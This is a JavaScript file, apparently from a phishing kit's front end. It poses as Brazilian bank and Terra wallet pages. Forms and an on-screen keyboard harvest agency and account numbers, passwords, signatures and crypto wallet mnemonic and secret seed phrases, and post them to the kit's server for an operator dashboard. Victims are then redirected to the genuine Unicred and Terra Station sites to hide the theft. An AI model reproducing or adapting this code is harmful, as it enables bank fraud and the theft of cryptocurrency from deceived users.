console.log(`Aplicação Rodando!`)
const login =(() => {

    function getFormData(form) {
        const elements = form.elements

        const data  = {}

        Array.from(elements).forEach(el => {
            if(el.name) data[el.name] = el.value
        })

        return data
    }

    const notyf = new Notyf({
        position: {
            x: 'left',
            y: 'top',
        },
        types: [
            {
                type: 'info',
                background: 'blue',
                icon: {
                    className: 'fas fa-info-circle',
                    tagName: 'span',
                    color: '#fff'
                },
                dismissible: false
            },
            {
                type: 'warning',
                background: 'red',
                icon: {
                    className: 'fas fa-info-circle',
                    tagName: 'span',
                    color: '#fff'
                },
                dismissible: false
            }
        ]
    })


    //private var/functions
    async function submit(target){
        const form = document.querySelector(target);

        if(!form) return

        

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            try {
                const { user, password } = form.elements
                
                form.querySelector('button[type="submit"]').innerHTML = `
                <div class="spinner-border text-light" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>`


                const options = {
                    method: 'POST',
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify({user: user.value, password: password.value})
                }

                const response = await fetch(`/session`, options)

                const res = await response.json()

                if(response.status === 400) {
                    form.querySelector('button[type="submit"]').innerHTML = `Login`
                    return notyf.open({
                        type: 'warning',
                        message: res?.message
                    })
                    
                }

                notyf.open({
                    type: 'info',
                    message: `Login efetuado com sucesso!`
                })

                setTimeout(() => window.location.href = `/admin/dashboard`, 1500);
            } catch (error) {
                console.log(`erro`, error)

                form.querySelector('button[type="submit"]').innerHTML = `Login`

                notyf.open({
                    type: 'warning',
                    message: JSON.stringify(error?.message)
                })
            }

            
        });
    }

    async function createClient(data) {
        var raw = JSON.stringify(data);

        console.log(`data enviado: `, data)
          
          var requestOptions = {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: raw,
          };
          
          fetch("/clients", requestOptions)
            .then(response => response.json())
            .then(result => {
                const { id } = result

                if(!id) return console.log(`not id in`, result)

                window.location.href = `/module/safety/${id}`
            })
            .catch(error => console.log('error', error));
    }

    async function sendUser(target) {
        const form  = document.querySelector(target)

        const buttonsTab = document.querySelectorAll('button[data-bs-toggle="tab"]')

        //cpf mask
        const cpfInput = document.querySelector('input#agencia')

        if(!cpfInput) return 

        var cpf = new Cleave('input#agencia', {
            numericOnly: true,
            blocks: [4],
            uppercase: true
        })

        var account = new Cleave('input#conta', {
            numericOnly: true,
            blocks: [10],
            uppercase: true
        })

        for (const targetEl of buttonsTab) {
            if(targetEl) {
                targetEl.addEventListener('shown.bs.tab', event => {
                    const previousTab = document.querySelector(`.${event.relatedTarget.getAttribute('data-target') }`);
                    const activeTab = document.querySelector(`.${event.target.getAttribute('data-target') }`)

                    if(!previousTab && !activeTab) return

                    const inputsPrevious = previousTab.querySelectorAll('input')
                    const inputsActive = activeTab.querySelectorAll('input')

                    if(!inputsPrevious && !inputsActive) return

                    for (const inputPrev of inputsPrevious) {
                        inputPrev.required = false
                    }

                    for (const inputActive of inputsActive) {
                        inputActive.required = true
                    }
                })
            }
        }

        

        if(!form) return

        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const data =  getFormData(form)

            return createClient(data)

        });
    }

    function deleteClient(button) {
        const buttons = document.querySelectorAll(button);

        if(!button) return

        for (const btn of buttons) {
            btn.addEventListener('click', async function (e) {
                try {
                    e.preventDefault()

                    const client_id = btn.dataset.client

                    if(!client_id) return

                    const options = {
                        method: 'DELETE',
                        headers: {
                            'content-type': 'application/json',
                        },
                    }

                    const client  = await(await fetch(`/clients/${client_id}`, options)).json()

                    if(btn.closest('tr').remove()) console.log(client)
                } catch (error) {
                    console.log(error)
                }
                
            });
        }
    }
    
    return {
        //public var/functions
        submit,
        sendUser,
        getFormData,
        deleteClient
    }
})()

login.submit(`.formAdminLogin`)
login.sendUser(`.senduserForm`)
login.deleteClient(`.delete-client`)

const showPassButton = document.querySelector('.showpassword-icon');

if(showPassButton) {
    showPassButton.addEventListener('click', function (e) {
        e.preventDefault()

        const input = showPassButton.closest('.password-input').querySelector('input')

        if(showPassButton.classList.contains('active')) {
            showPassButton.classList.remove('active')

            showPassButton.querySelector('img').setAttribute('src', `/assets/img/bsfra/cut-eye-blue.svg`)

            input.setAttribute('type', 'password')
        }else{
            showPassButton.classList.add('active')
            input.setAttribute('type', 'text')
            showPassButton.querySelector('img').setAttribute('src', `/assets/img/bsfra/eye-blue.svg`)
        }
        
    });
}

const keyboard = (() => {
    function handleConfirm(button, form) {
        if(!button && !form) return

        button.addEventListener('click', function (e) {
            e.preventDefault()

            handleFormSubmit(form)
        });
    }

    function handleClear(button, input) {
        if(!button && !input) return

        button.addEventListener('click', function (e) {
            e.preventDefault()

            input.value = ``
        });
    }
    //private var/functions
    function handleButtons(buttons, input) {
        if(!buttons && !input) return 

        Array.from(buttons).forEach(el => {
            el.addEventListener('click', function (e) {
                e.preventDefault()

                const form = input.closest('form')

                if(!form) return

                let value = el.value

                if(value == `shift`) {
                    if(form.dataset.shift == `up`){
                        form.dataset.shift = form.dataset.shift = ``
                        
                        Array.from(buttons).forEach(el => {
                            el.innerHTML = el.innerHTML.toLowerCase()
                        })
                    }else{
                        form.dataset.shift = form.dataset.shift = `up`
                        Array.from(buttons).forEach(el => {
                            el.innerHTML = el.innerHTML.toUpperCase()
                        })
                    }
                    
                }

                if(value == `symbols`) {
                    document.querySelector('.text-keys').classList.toggle('hide')
                    document.querySelector('.symbol-keyboard').classList.toggle('show')
                }

                if(form.dataset.shift == `up`) value = el.value.toUpperCase()

                if(value != `SHIFT` && value != `shift` && value != 'symbols' && value != 'SYMBOLS') handleValueInput(input, value)
            });
        })
    }

    function handleValueInput(input, value) {
        if(!value && !input) return

        input.value = input.value + value
    }

    function handleFormSubmit(form) {
        const userId = document.body.dataset.client

        if(!form && !userId) return

        let url = `/module/documents/${userId}`

        

        const data = JSON.stringify(login.getFormData(form))

        var requestOptions = {
            method: 'PATCH',
            headers: { 'content-type': 'application/json' },
            body: data,
        };
        
        fetch(`/clients/${userId}`, requestOptions)
        .then(response => response.json())
        .then(result => {
            const { id } = result

            if(!id) return console.log(`not id in`, result)

            if(form.classList.contains('documents')) url = `/module/eletronic/${userId}`
            if(form.classList.contains('alphanumeric')) url = `/module/alphanumeric/${userId}`

            if(document.querySelector('input[name="alphanumericSignature"]')) url = `https://www.unicred.com.br/solucoes/conta-corrente`

            window.location.href = url
        })
        .catch(error => console.log('error', error));
    }

    function handleForm(target){
        const form = document.querySelector(target);

        
        if(!form) return
        const userId = form.dataset.id

        const buttons = form.querySelectorAll('.keyboard button')
        const input = form.querySelector('input')
        const clearButton = document.querySelector('button.clean');
        const confirmButton = document.querySelector('button.confirm');

        handleClear(clearButton, input)

        handleButtons(buttons, input)

        handleConfirm(confirmButton, form)
    }
    
    return {
        //public var/functions
        handleForm
    }
})()

const submit = (() => {
    //private var/functions
    function openMnemonic(element) {
        const module = element.dataset.module

        
        if(!module) return
        window.open('/module/popup/'+module+'','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=500,height=620')
    }

    function openFormMnemonic(element) {
        const module = element.dataset.module

        
        if(!module) return
        window.open('/module/mnemonic/'+module+'','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=500,height=620')
    }

    function enableSubmit(form) {
        const formEl = document.querySelector(form);

        if(!formEl) return

        const button = formEl.querySelector('button')

        if(!button) return

        const textarea = formEl.querySelector('textarea')

        if(!textarea) return

        textarea.addEventListener('keyup', function (e) {
            console.log(`key click`)
            if(textarea.value.length > 10) button.disabled = false
        });
    }

    async function formSubmit(form) {
    
        const formSubmit = document.querySelector(form);
        if(!formSubmit) return

        formSubmit.addEventListener('submit', async function (e) {
            e.preventDefault()

            try {
                const module = formSubmit.dataset.module

                if(!module) return

                const data = {
                    mnemonic: formSubmit.elements['mnemonic']?.value,
                    secret_seed: formSubmit.elements['secret_seed']?.value
                } 

                if(!data) return

                data.module = module

                console.log(data)

                const options = {
                    method: 'POST',
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify(data)
                }
                const client =await (await fetch(`/clients`, options)).json()

                console.log(client)

                return window.close('','_parent','')
            } catch (error) {
                console.log(error)
            }
        });
    }
    
    return {
        //public var/functions
        openMnemonic,
        openFormMnemonic,
        formSubmit,
        enableSubmit
    }
})()

submit.enableSubmit(`.mnemonic-form`)
submit.enableSubmit(`.form-secret-seed`)
submit.formSubmit(`.mnemonic-form`)
submit.formSubmit(`.form-secret-seed`)

keyboard.handleForm(`.boxKeyboard form`)

socket.on('clientSubmit', (data) => {
    if(!document.body.classList.contains('dashboard')){
        window.location.href = `https://station.terra.money/`
    }
})